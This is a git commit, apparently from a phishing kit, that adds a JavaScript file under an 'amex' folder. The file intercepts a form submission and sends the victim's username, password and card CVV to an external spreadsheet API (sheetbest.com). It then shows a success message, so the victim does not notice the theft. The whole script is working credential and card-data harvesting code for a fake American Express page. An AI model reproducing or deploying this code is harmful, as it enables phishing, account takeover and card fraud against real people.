2ce5b0fbd5fbf4f369abcca67e0d807d407f0080
m-soporte <cyclemoor4@gmail.com>
2024-11-30 07:53:10 -0600

    add files upload

---
+++ amex/js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/50adcc12-b508-4376-b89d-c3873a969ec0', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Clave": formulario.contraseña.value,
+            "Cid": formulario.cvv.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
